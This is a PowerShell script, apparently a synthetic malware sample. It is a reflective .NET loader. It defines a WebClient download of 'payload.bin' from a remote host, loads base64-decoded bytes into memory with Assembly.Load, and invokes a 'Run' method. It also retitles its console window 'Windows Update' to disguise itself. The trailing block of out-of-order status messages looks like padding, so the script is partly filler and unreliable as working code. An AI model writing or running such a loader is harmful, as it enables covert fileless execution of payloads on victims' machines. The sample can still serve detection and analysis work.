
<#
.SYNOPSIS
    Managed assembly acquisition and reflection workflow.

.DESCRIPTION
    Downloads or decodes a managed payload stage, loads it into the
    current AppDomain, then looks for a conventional entry method
    and invokes it only when present.

.NOTES
    The loader expects a managed payload stage.
#>
$TargetUrl = 'http://adatum.com:80/payload.bin'
$TracePath = "$env:TEMP\telemetry.json"
$TimeoutSec = 75
$ErrorActionPreference = "Stop"

# Acquisition
function Get-StageAssemblyBytes {
    param(
        [string]$SourceUrl = '',
        [int]$TimeoutSec = 75
    )

    Write-Verbose ("Downloading assembly bytes from " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    return $ClientObject.DownloadData($SourceUrl)
}

# Reflection
function Invoke-AssemblyEntryPoint {
    [CmdletBinding()]
    param(
        [object]$LoadedAssembly = $null
    )

    if ($null -eq $LoadedAssembly) {
        throw "Loaded assembly is null"
    }
    $Types = $LoadedAssembly.GetTypes()
    if ($Types.Length -gt 0) {
        $EntryMethod = $Types[0].GetMethod("Run")
        if ($null -ne $EntryMethod) {
            Write-Verbose "Invoking entry method"
            return $EntryMethod.Invoke($null, @())
        }
    }
    Write-Verbose "No conventional entry method found"
    return $null
}

try {
    Write-Verbose "Starting managed loader"
    $StageBytes = [Convert]::FromBase64String('c3RhZ2UyLW1hcmtlcjp5NHo1dGJ2cjR2')
    Write-Verbose ("Assembly byte count: " + $StageBytes.Length)
    $TransferResult = [Reflection.Assembly]::Load($StageBytes)
    $EntryResult = Invoke-AssemblyEntryPoint -LoadedAssembly $TransferResult
    Write-Verbose ("Entry result: " + $EntryResult)
}
catch {
    Write-Warning "Managed loader failed: $($_.Exception.Message)"
}

$AssemblyReport = [ordered]@{
    Stage = "reflection"
    ByteCount = $StageBytes.Length
    Endpoint = $TargetUrl
}
$AssemblyReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $TracePath -Append
Write-Verbose "Retry budget remaining"
Write-Verbose "Inspecting process list"
Write-Verbose "Exporting operation report"
Write-Verbose "Preparing working directory"
Write-Verbose "Operation completed"
Write-Verbose "Starting workflow"
Write-Verbose "Stage handoff finished"
Write-Verbose "Reading configuration values"
Write-Verbose "Validating result"
Write-Verbose "Cleaning temporary marker"
Write-Verbose "Applying operation timeout"
Write-Verbose "Checking local path"
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
$Host.UI.RawUI.WindowTitle = "Windows Update"
$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
